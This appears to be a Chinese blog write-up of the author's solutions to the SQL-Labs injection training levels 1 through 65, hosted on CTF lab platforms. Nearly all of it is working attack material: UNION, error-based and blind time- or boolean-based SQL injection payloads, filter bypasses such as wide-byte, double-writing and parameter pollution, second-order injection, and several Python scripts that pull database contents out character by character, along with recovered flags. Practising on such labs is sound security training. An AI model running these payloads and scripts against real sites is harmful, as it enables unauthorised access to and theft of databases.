---
title: "SQL-Labs 刷题记录"
date: 2021-07-20 00:00:00
updated: 2022-03-15 18:58:39
tags:
  - CTF
  - Web安全
description: "SQL-Labs 靶场刷题记录：前七关的注入手法与绕过思路"
---

# SQL-Labs 刷题记录

### 注：本文脚本需要根据自身情况修改

## 第一关

?id=1’ or 1=1 %23 //字符型注入
?id=1’ or 1=1 union select 1,2,3,4%23 //报错字段为3
?id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata%23 //爆全部库
库名 challenges,ctftraining,information_schema,mysql,performance_schema,security,test
?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = ‘ctftraining’%23 //查库
?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name = ‘flag’%23 //查水表
?id=-1’ union select 1,2,flag from ctftraining.flag%23 //跨库查询

## 第二关

?id=1’ or 1=1 # 报错’ or 1=1 LIMIT 0,1 考虑数字型注入
?id=1 or 1=1 //成功为数字型注入
?id=-1 union select 1,2,flag from ctftraining.flag%23
接下来的步骤和第一关一样

## 第三关

?id=1’)or 1=1 # //接下来应该一样
?id=-1’) union select 1,2,flag from ctftraining.flag%23

## 第四关

?id=1“)or 1=1 # //接下来应该一样
?id=-1”) union select 1,2,flag from ctftraining.flag%23

## 第五关

报错注入也行
?id=2’and 1=1 %23
?id=2’and 1=2 %23无回显

贴上我的脚本

```python
import requests
import time
url = "http://46be5e92-e82c-4f5b-a5b9-5a6fa17b8493.node4.buuoj.cn/Less-5/?id=2 'and "

result=""
for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        # payload="if(ascii(substr(database(),{},1))>{},1,0) %23".format(i,mid) #查所在库
        # payload="if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{},1,0) %23".format(i,mid) #查全部库
        # payload="if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctftraining'),{},1))>{},1,0) %23".format(i,mid) #查水表名
        # payload="if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flag'),{},1))>{},1,0) %23".format(i,mid) #查水表
        payload="if(ascii(substr((select flag from ctftraining.flag),{},1))>{},1,0) %23".format(i,mid) #爆flag
        # print(url+payload)
        r=requests.get(url+payload)
        # print(r.text)
        time.sleep(1) #buu蛋疼的限制所限制
        if "You are in..........." in r.text:
            head=mid+1
        else:
            tail=mid

    if head !=32:
        result+=chr(head)
    else:
        break
    
    print(result)
```

## 第六关

脚本中url的 ‘ 改 \“ 就行了

## 第七关

到第一关查路径先
?id=-1’union select 1,@@basedir,@@datadir %23
Your Login name:/usr
Your Password:/var/lib/mysql/
emmmm网站路径写不进去？？？？
上面那个貌似不是路径
记录一下还没写出来
语句是union select 1,2,’‘into outfile ‘路径’

## 第八关

第五个脚本可以用

## 第九关

判断闭合 and if(1=2,1,sleep(10)) # 看刷新时间
一般闭合为 ‘ “ ‘) “)多试试加括号。。。应该是这样
时间盲注
贴给脚本

```python
import requests
import time
url = "http://e4cb6dc3-7b2c-4c2a-913c-c7e1a9dae714.node4.buuoj.cn/Less-9/?id=2 'and "

result=""
for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        payload="if(ascii(substr(database(),{},1))>{},sleep(1),0) %23".format(i,mid)
        # payload="if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{},1,0) %23".format(i,mid)
        # payload="if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctftraining'),{},1))>{},sleep(1),0) %23".format(i,mid)
        # payload="if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flag'),{},1))>{},sleep(1),0) %23".format(i,mid)
        # payload="if(ascii(substr((select flag from ctftraining.flag),{},1))>{},sleep(1),0) %23".format(i,mid)
        # print(url+payload)
        start_time=time.time()
        r=requests.get(url+payload)
        #print(r.text)
        if time.time()-start_time>=1:
            head=mid+1
        else:
            tail=mid

    if head !=32:
        result+=chr(head)
    else:
        break
    
    print(result)
```

## 第十关

把上面payload的’改为"

## 第十一关

跟第一关一样，只是改了请求方式
字段改了为2 其中%23改为# 不需要编码了
-1’ union select 1,flag from ctftraining.flag #

## 第十二关

跟第十一关一样，把’改为”)
-1”) union select 1,flag from ctftraining.flag#

## 第十三关

post类型盲注，还好学了一丢丢爬虫
这边贴个脚本。。。在前几个脚本基础上做的修改

```python
import requests
import time
url = "http://e4cb6dc3-7b2c-4c2a-913c-c7e1a9dae714.node4.buuoj.cn/Less-13/"

result=""
for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        # data={"uname": "1') or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{},1,0) #".format(i,mid),"passwd": 1}
        # data={"uname": "1') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctftraining'),{},1))>{},1,0) #".format(i,mid),"passwd": 1}
        # data={"uname": "1') or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flag'),{},1))>{},1,0) #".format(i,mid),"passwd": 1}
        data={"uname": "1') or if(ascii(substr((select flag from ctftraining.flag),{},1))>{},1,0) #".format(i,mid),"passwd": 1}
        
        r=requests.post(url=url,data=data)
        # print(r.text)
        time.sleep(1)
        if "flag.jpg" in r.text:
            head=mid+1
        else:
            tail=mid

    if head !=32:
        result+=chr(head)
    else:
        break
    
    print(result)
```

## 第十四关

把上面中的 ‘) 换成 “

## 第十五关

判断闭合’ or if(1=2,1,sleep(10)) #
时间盲注POST版
贴上我的脚本

```php
import requests
import time
url = "http://e4cb6dc3-7b2c-4c2a-913c-c7e1a9dae714.node4.buuoj.cn/Less-15/"

result=""
for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        # data={"uname": "1' or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{},sleep(1),0) #".format(i,mid),"passwd": 1}
        # data={"uname": "1' or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{},sleep(0.5),0) #".format(i,mid),"passwd": 1}
        # data={"uname": "1' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctftraining'),{},1))>{},sleep(0.5),0) #".format(i,mid),"passwd": 1}
        # data={"uname": "1' or if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flag'),{},1))>{},sleep(0.5),0) #".format(i,mid),"passwd": 1}
        data={"uname": "1' or if(ascii(substr((select flag from ctftraining.flag),{},1))>{},sleep(0.5),0) #".format(i,mid),"passwd": 1}

        start_time=time.time()
        r=requests.post(url=url,data=data)
        #print(r.text)
        if time.time()-start_time>=1:
            head=mid+1
        else:
            tail=mid

    if head !=32:
        result+=chr(head)
    else:
        break
    
    print(result)
```

## 第十六关

判断闭合 “)or if(1=2,1,sleep(10)) #
把上面脚本的 ‘ 改为 ")

## 第十七关

username必须得admin才行，没想到。。靠！！！
报错注入
1’ or updatexml(1,concat(0x26,database(),0x26),1)#
1’ or updatexml(1,concat(0x26,database(),0x26),1)#
1’ or updatexml(1,concat(0x26,(select right(group_concat(schema_name),30) from information_schema.schemata),0x26),1)#
1’ or updatexml(1,concat(0x26,(select left(group_concat(schema_name),30) from information_schema.schemata),0x26),1)#
左右拼接一下就是库名
····中间差不多不多赘述了
1’ or updatexml(1,concat(0x26,(select left(flag,30) from ctftraining.flag),0x26),1)#
1’ or updatexml(1,concat(0x26,(select right(flag,30) from ctftraining.flag),0x26),1)#
左右拼接一下就是flag

另一个函数 注：该函数一次只能查询32位长度
extractvalue(1,concat(0x26,(SQL语句),0x26));

## 第十八关

把UA换成 ‘ or updatexml(1,concat(0x26,database(),0x26),1)and’
应该是后面还有语句，没想到。。。看看源码

```php
$result1 = mysql_query($sql);
$row1 = mysql_fetch_array($result1);
if($row1)//登录成功
{
        //将用户的uagent,ip,uname插入到一张表中
        $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";

        mysql_query($insert); //进行插入数据

        echo 'Your User Agent is: ' .$uagent;
        print_r(mysql_error());  //输出详细错误       
}

else
{
        echo '<font color= "#0000ff" font size="3">';
        print_r(mysql_error()); //输出详细错误
        echo '<img src="../images/slap.jpg"   />';
        echo "</font>";  
        }
```

果然是
‘ or updatexml(1,concat(0x26,(select right(flag,30) from ctftraining.flag),0x26),1) and ‘
‘ or updatexml(1,concat(0x26,(select left(flag,30) from ctftraining.flag),0x26),1) and ‘
读取flag

## 第十九关

改referer和上面一样

## 第二十关

这个不看源码做不了吧。。。。。

```php
//uname和passwd都做了过滤,而cookie没有，直接获取
$cookee = $_COOKIE['uname'];
$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
//存在一个跟cookie相关的sql语句操作，由于未进行任何过滤，所以存在cookie注入
```

buu没有回显。。。。
ctfshow有。。。
常规注入
不做赘述
查看17题

## 第二十一关

记得base64编码
admin’) or updatexml(1,concat(0x26,(select right(group_concat(schema_name),30) from information_schema.schemata),0x26),1)#
admin’) or updatexml(1,concat(0x26,(select left(group_concat(schema_name),30) from information_schema.schemata),0x26),1)#
admin’) or updatexml(1,concat(0x26,(select left(group_concat(table_name),30) from information_schema.tables where table_schema=’ctfshow’),0x26),1)#
admin’) or updatexml(1,concat(0x26,(select left(group_concat(column_name),30) from information_schema.columns where table_name=’flag’),0x26),1)#
admin’) or updatexml(1,concat(0x26,(select right(group_concat(flag4),30) from ctfshow.flag),0x26),1)#
ctfshow{2e2f5457-7c1f-4c62-be9b-e60e06bcf98f}

## 第二十二关

把上面的’)改“
步骤差不多
ctfshow{58706930-1993-4c33-98d4-91326f15b2c2}

## 第二十三关

?id=1’or updatexml(1,concat(0x26,(select left(group_concat(schema_name),30) from information_schema.schemata),0x26),1)and ‘
然后差不多
?id=1’or updatexml(1,concat(0x26,(select left(group_concat(table_name),30) from information_schema.tables where table_schema=’ctfshow’),0x26),1)and ‘
?id=1’or updatexml(1,concat(0x26,(select left(group_concat(column_name),30) from information_schema.columns where table_name=’flag’),0x26),1)and ‘
?id=1’or updatexml(1,concat(0x26,(select left(group_concat(flag4),30) from ctfshow.flag),0x26),1)and ‘
ctfshow{c3322c5b-e92d-4b1b-82d0-d18b4f075da6}

## 第二十四关

可以改管理员密码。。不太会，查不到库里面的数据

You tried to be smart, Try harder!!!! :(
别骂了别骂了。。
admin’ or if(1=2,1,sleep(5)) #让服务器炸了
二次注入加时间盲注

```python
import requests
session=requests.session()
i=0
result=""

for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        # payload = f'if(ascii(substr((select group_concat(table_name)from(information_schema.tables)where(table_schema="ctfshow")),{i},1))>{mid},sleep(1),0)'
        # payload = f'if(ascii(substr((select group_concat(column_name)from(information_schema.columns)where(table_schema="ctfshow")),{i},1))>{mid},sleep(0.7),0)'
        payload = 'if(ascii(substr((select group_concat(flag4)from(ctfshow.flag)),{},1))>{},sleep(1),0)'.format(i,mid)
        username = "admin' and {} or '2'='2".format(payload)
        url1 = 'http://58962273-3e5b-4881-8bef-750836065431.challenge.ctf.show:8080/login_create.php'
        data1 = {
            'username': username,
            'password': '1',
            're_password': '1',
            'submit': 'Register'
        }
        r1 = session.post(url1, data=data1)
        url2 = 'http://58962273-3e5b-4881-8bef-750836065431.challenge.ctf.show:8080/login.php'
        data2 = {
            'login_user': username,
            'login_password': '1',
            'mysubmit': 'Login',
        }
        r2 = session.post(url2, data=data2)
        url3 = 'http://58962273-3e5b-4881-8bef-750836065431.challenge.ctf.show:8080/pass_change.php'
        data3 = {
            'current_password': '1',
            'password': '2',
            're_password': '2',
            'submit': 'Reset'
        }

        try:
            r = session.post(url3,data=data3,timeout=0.9)
            tail = mid

        except:
            head = mid + 1


    if head !=32:
        result+=chr(head)
    else:
        break
    
    print(result)
```

## 第二十五关

报错注入,双写绕过也行
?id=1%27^extractvalue(1,concat(0x7e,(select(database()))))%23
?id=1’^updatexml(1,concat(0x26,(select group_concat(schema_name) from infoorrmation_schema.schemata),0x26),1)%23
?id=1’^updatexml(1,concat(0x26,(select left(group_concat(table_name),30) from infoorrmation_schema.tables where table_schema=’ctfshow’),0x26),1)%23
?id=1’^updatexml(1,concat(0x26,(select left(group_concat(column_name),30) from infoorrmation_schema.columns where table_name=’flags’),0x26),1)%23
?id=1’^updatexml(1,concat(0x26,(select right(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23
?id=1’^updatexml(1,concat(0x26,(select left(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23
ctfshow{80fa6629-bc4a-4564-93b9-106eee1fe209}

## 第二十五关a

?id=-1 union select 1,2,group_concat(schema_name)from infoorrmation_schema.schemata%23爆库名
?id=-1 union select 1,2,group_concat(table_name)from infoorrmation_schema.tables where table_schema=’ctfshow’%23
?id=-1 union select 1,2,group_concat(column_name)from infoorrmation_schema.columns where table_name=’flags’%23
?id=-1 union select 1,2,group_concat(flag4s) from ctfshow.flags%23

## 第二十六关

?id=1’^extractvalue(1,concat(0x7e,(select(database())))) and’
?id=1’^updatexml(1,concat(0x26,(select(group_concat(schema_name))from(infoorrmation_schema.schemata)),0x26),1)anandd’
?id=1’^updatexml(1,concat(0x26,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)like(‘ctfshow’)),0x26),1)anandd’
?id=1’^updatexml(1,concat(0x26,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)like(‘ctfshow’)),0x26),1)anandd’
?id=1’^updatexml(1,concat(0x26,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name)like(‘flags’)),0x26),1)anandd’
?id=1’^updatexml(1,concat(0x26,(select(right(group_concat(flag4s),30))from(ctfshow.flags)),0x26),1)anandd’
ctfshow{bbad336b-ea6c-4094-8888-c27b7a6ec0d0}
b-ea6c-4094-8888

## 第二十六关a

盲注

```python
import requests
import time
url = "http://923efabc-d503-4bbd-a28d-8f1631620fe1.challenge.ctf.show:8080/"

result=""
for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        # payload="?id=100')||if(ascii(substr((select(group_concat(schema_name))from(infoorrmation_schema.schemata)),{},1))>{},1,0)||('0".format(i,mid)
        # payload="?id=100')||if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)='ctfshow'),{},1))>{},1,0)||('0".format(i,mid)
        #payload="?id=100')||if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name)='flags'),{},1))>{},1,0)||('0".format(i,mid)
        payload="?id=100')||if(ascii(substr((select(flag4s)from(ctfshow.flags)),{},1))>{},1,0)||('0".format(i,mid)
        # print(url+payload)

        r=requests.get(url+payload)
        if "Your Password:Dumb" in r.text:
            head=mid+1
        else:
            tail=mid
    if head !=32:
        result+=chr(head)
    else:
        break
    
    print(result)
```

## 第二十七关

大写绕过，也可以用上面的脚本，大写绕过
?id=1’^updatexml(1,concat(0x26,(sElect(group_concat(schema_name))from(information_schema.schemata)),0x26),1)||’0
?id=1’^updatexml(1,concat(0x26,(sElect(group_concat(table_name))from(information_schema.tables)),0x26),1)||’0
?id=1’^updatexml(1,concat(0x26,(sElect(group_concat(column_name))from(information_schema.columns)),0x26),1)||’0
?id=1’^updatexml(1,concat(0x26,(sElect(group_concat(flag4s))from(ctfshow.flags)),0x26),1)||’0
ctfshow{33995233-b6a5-4717-b457-76add1addd7c}
?id=1’^updatexml(1,concat(0x26,(sElect(right(group_concat(flag4s),30))from(ctfshow.flags)),0x26),1)||’0
3-b6a5-4717-b457-76add1addd7c}

## 第二十七关a

把教本的’)换成”
ctfshow{673c8abe-5548-48b4-b1b7-0338d3f4d45e}

## 第二十八关

用脚本闭合 ‘)

## 第二十八关a

不能报错注入用脚本

## 第二十九关

http参数污染
waf解析前者，服务器解析后者
?id=1&id=-2’union select 1,2,group_concat(flag4s) from ctfshow.flags %23
ctfshow{97c5088d-09f4-413c-a515-de989a1c32fe}

## 第三十关

?id=1&id=-2“union select 1,2,group_concat(flag4s) from ctfshow.flags %23

## 第三十一关

?id=1&id=-2”)union select 1,2,group_concat(flag4s) from ctfshow.flags %23

## 第三十二关

宽字节注入 %df 吃
?id=-2%df’union select 1,2,group_concat(flag4s) from ctfshow.flags %23

## 第三十三关

一样

## level 34

十六进制代替 “ “里的东西

1 �’union select 1,group_concat(schema_name) from information_schema.schemata #
1 �’union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x63746673686f77 #

## level 35

有点直接。。。数字型注入？？？
?id=-1 union select 1,2,flag4s from ctfshow.flags%23

## level 36

emmm
?id=-1�’union select 1,2,flag4s from ctfshow.flags%23

## level 37

emmm
-1�’union select 1,2,flag4s from ctfshow.flags#

## level 38

emmm
-1�’union select 1,flag4s from ctfshow.flags#

## level 39

emmm
?id=-1 union select% 1,2,flag4s from ctfshow.flags%23

## level 40

盲注跑脚本就是了

```python
import requests
import time
url = "http://591c712f-cd11-4547-94e0-27df596874e3.challenge.ctf.show:8080/"

result=""
for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        #?id=100"||if(ascii(substr((seLeCt(group_concat(schema_name))from(information_schema.schemata)),1,1))>9999,1,0)||"0
        # payload="?id=100')||if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),{},1))>{},1,0)%23".format(i,mid)
        # payload="?id=100')||if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)='ctfshow'),{},1))>{},1,0)||('0".format(i,mid)
        # payload="?id=100')||if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name)='flags'),{},1))>{},1,0)||('0".format(i,mid)
        payload="?id=1') and if(ascii(substr((seLect(flag4s)from(ctfshow.flags)),{},1))>{},1,0)%23".format(i,mid)
        # print(url+payload)

        r=requests.get(url+payload)

        if "Your Username is : Dumb" in r.text:
            head=mid+1
        else:
            tail=mid
    if head !=32:
        result+=chr(head)
    else:
        break
    
    print(result)
```

中间没改，要用的话自己改改

## level 41

上面脚本 里面的 ‘) 去掉就行’

## level 42

密码处
-1’ union select 1,2,3#
-1’ union select 1,flag4s,3 from ctfshow.flags#

## level 43

-1’) union select 1,2,3 #
-1’) union select 1,flag4s,3 from ctfshow.flags#

## level 44

admin’ or if(ascii(substr(database(),1,1))>1,sleep(3),0) #
时间盲注。。脚本改一改

## level 45

admin’) or 1=1 #
admin’) or if(ascii(substr(database(),1,1))>1,sleep(3),0) #
时间盲注改一改

## level 46

报错注入
1 or updatexml(1,concat(0x26,(select left(group_concat(schema_name),30) from information_schema.schemata),0x26),1)#
1 or updatexml(1,concat(0x26,(select right(group_concat(schema_name),30) from information_schema.schemata),0x26),1)#
1 or updatexml(1,concat(0x26,(select right(group_concat(table_name),30) from information_schema.tables where table_schema=’ctfshow’),0x26),1)#
1 or updatexml(1,concat(0x26,(select right(group_concat(column_name),30) from information_schema.columns where table_name=’flags’),0x26),1)#
1 or updatexml(1,concat(0x26,(select right(group_concat(flag4s),30) from ctfshow.flags),0x26),1)#
1 or updatexml(1,concat(0x26,(select left(group_concat(flag4s),30) from ctfshow.flags),0x26),1)#
ctfshow{04b1482e-203c-44f1-8bb6-df5b27801821}

## level 47

1’or updatexml(1,concat(0x26,(select left(group_concat(schema_name),30) from information_schema.schemata),0x26),1)%23
..
..
..
..
1’ or updatexml(1,concat(0x26,(select right(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23
1’ or updatexml(1,concat(0x26,(select left(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23

ctfshow{749b597e-5a51-495b-b92c-1a3accd21bc0}

?sort=1’or if(ascii(substr(database(),1,1))>1,sleep(0.5),0) %23

## level 48

```python
import requests
url = "http://ee9f5ee9-1368-4d89-a875-1a44cfdf308e.challenge.ctf.show:8080/?sort=1 and "

result=""
for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        # payload="if(ascii(substr(database(),{},1))>{},sleep(0.5),0) %23".format(i,mid)
        # payload="if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{},sleep(1),0) %23".format(i,mid)
        # payload="if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctftraining'),{},1))>{},sleep(1),0) %23".format(i,mid)
        # payload="if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flag'),{},1))>{},sleep(1),0) %23".format(i,mid)
        payload="if(ascii(substr((select flag4s from ctfshow.flags),{},1))>{},sleep(0.5),0) %23".format(i,mid)
        # print(url+payload)
        # start_time=time.time()
        r=requests.get(url+payload)
        print(url+payload)
        #print(r.text)
        try:
            r = requests.get(url+payload,timeout=0.4)
            tail = mid

        except:
            head = mid + 1

    if head !=32:
        result+=chr(head)
    else:
        break
    
    print(result)
```

ctfshow{6d997ae2-953d-4117-8563-e426fb32bc65}

## level 49

时间盲注

1’ and if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),1,1))>2,sleep(0.5),0) %23

贴个脚本，自己改

```py
import requests
url = "http://583bbd02-c708-41eb-86ab-f792729f9843.node4.buuoj.cn/Less-49/?sort=1' and "

result=""
for i in range(1,1290):
    head=32
    tail=127
    while head<tail:
        mid=(head+tail)>>1
        payload="if(ascii(substr(database(),{},1))>{},sleep(0.5),0) %23".format(i,mid)
        # payload="if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))>{},sleep(1),0) %23".format(i,mid)
        # payload="if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctftraining'),{},1))>{},sleep(1),0) %23".format(i,mid)
        # payload="if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flag'),{},1))>{},sleep(1),0) %23".format(i,mid)
        # payload="if(ascii(substr((select flag4s from ctfshow.flags),{},1))>{},sleep(0.5),0) %23".format(i,mid)
        # print(url+payload)
        # start_time=time.time()
        r=requests.get(url+payload)
        print(url+payload)
        #print(r.text)
        try:
            r = requests.get(url+payload,timeout=0.4)
            tail = mid

        except:
            head = mid + 1

    if head !=32:
        result+=chr(head)
    else:
        break
    
    print(result)
```

## level 50

1 or updatexml(1,concat(0x26,(select right(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23
1 or updatexml(1,concat(0x26,(select left(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23

ctfshow{0f3c691a-ba65-4f5b-ad46-bc0e58100b9e}

## level 51

1’or updatexml(1,concat(0x26,(select right(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23
1’or updatexml(1,concat(0x26,(select left(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23
ctfshow{23972c5c-3569-4115-8572-0f754336659a}

## level 52

时间盲注
?sort=1 and if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),1,1))>2,sleep(5),0) %23
49那个脚本改一改

## level 53

时间盲注脚本跑一跑
?sort=1’ and if(ascii(substr(database(),1,1))>114,sleep(0.5),0) %23

## level 54

网上没环境了
用docker搭了个环境自己做
10次机会
先写好语句
id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata %23
id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’challenges’ %23
N4QU4VGMDT
id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’N4QU4VGMDT’ %23
secret_XA5R
?id=-1’union select 1,group_concat(secret_XA5R),3 from challenges.N4QU4VGMDT %23

## level 55

?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’challenges’%23
?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’RW5TWVFDYU’%23
?id=-1) union select 1,group_concat(secret_O1KM),3 from challenges.RW5TWVFDYU%23

## level 56

?id=-1’) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’challenges’%23
MMFDGR6C60
?id=-1’) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’MMFDGR6C60’%23
secret_ZGCM
?id=-1’) union select 1,group_concat(secret_ZGCM),3 from challenges.MMFDGR6C60%23

## level 57

?id=-1” union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’challenges’%23
UCNSDJBA2P
?id=-1” union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’UCNSDJBA2P’%23
secret_7COO
?id=-1” union select 1,group_concat(secret_7COO),3 from challenges.UCNSDJBA2P%23

## level 58

没有回显,有报错信息
报错注入
1’ or updatexml(1,concat(0x26,(select right(group_concat(table_name),30) from information_schema.tables where table_schema=’challenges’),0x26),1)%23
WMYP9VS7T2
1’ or updatexml(1,concat(0x26,(select right(group_concat(column_name),30) from information_schema.columns where table_name=’WMYP9VS7T2’),0x26),1)%23
secret_YKLV
1’ or updatexml(1,concat(0x26,(select right(group_concat(secret_YKLV),30) from challenges.WMYP9VS7T2),0x26),1)%23
BzE8UovoHobfXoFK5rflIeMo

## level 59

?id=1 or updatexml(1,concat(0x26,(select right(group_concat(table_name),30) from information_schema.tables where table_schema=’challenges’),0x26),1)%23
WZBWCK0O8M
?id=1 or updatexml(1,concat(0x26,(select right(group_concat(column_name),30) from information_schema.columns where table_name=’WZBWCK0O8M’),0x26),1)%23
secret_CNZ0
?id=1 or updatexml(1,concat(0x26,(select right(group_concat(secret_CNZ0),30) from challenges.WZBWCK0O8M),0x26),1)%23
JeF0NQQk0TXsVJM6MzoPbtiL

## level 60

?id=1”)or updatexml(1,concat(0x26,(select right(group_concat(table_name),30) from information_schema.tables where table_schema=’challenges’),0x26),1)%23
IYK33M1WVE
?id=1”)or updatexml(1,concat(0x26,(select right(group_concat(column_name),30) from information_schema.columns where table_name=’IYK33M1WVE’),0x26),1)%23
secret_WL6G
?id=1”)or updatexml(1,concat(0x26,(select right(group_concat(secret_WL6G),30) from challenges.IYK33M1WVE),0x26),1)%23
f3Vhf9q9mInCQoAqyOXGCLcy

## level 61

?id=1’))or updatexml(1,concat(0x26,(select right(group_concat(table_name),30) from information_schema.tables where table_schema=’challenges’),0x26),1)%23
UEEUBQKDFE
?id=1’))or updatexml(1,concat(0x26,(select right(group_concat(column_name),30) from information_schema.columns where table_name=’UEEUBQKDFE’),0x26),1)%23
secret_RMS1
?id=1”)or updatexml(1,concat(0x26,(select right(group_concat(secret_RMS1),30) from challenges.UEEUBQKDFE),0x26),1)%23
KnCHCTocAwPG2sToN2wUczxu

## level 62

上脚本

```python
import requests
import time
import string
url = "http://100.100.1.20/Less-62/index.php"



def quick(load):
    result=""
    for i in range(1,1290):
        head=32
        tail=127
        while head<tail:
            mid=(head+tail)>>1
            payload = load % (i,mid)
            # print(url+payload)
            r=requests.get(url+payload)
            # print(r.text)
            if "Your Login name : Angelina" in r.text:
                head=mid+1
            else:
                tail=mid
        if head !=32:
            result+=chr(head)
        else:
            break
        
        print(result)
    return result

    
table_name = quick(
    "?id=1')and if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='challenges'),%s,1))>%s,1,0)%%23"
)
print("table_name:"+table_name)

column_name = quick(
    "?id=1')and if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='"+table_name+"'),%s,1))>%s,1,0)%%23"
)
column_name=column_name[10:21]
print("column_name:"+column_name)

secret_key=quick(
    "?id=1')and if(ascii(substr((select(group_concat("+column_name+"))from(challenges."+table_name+")),%s,1))>%s,1,0)%%23"
)
print(secret_key)
```

唯快不破

## level 63

闭合方式改为’

## level 64

闭合方式改为))

## level 65

闭合”)
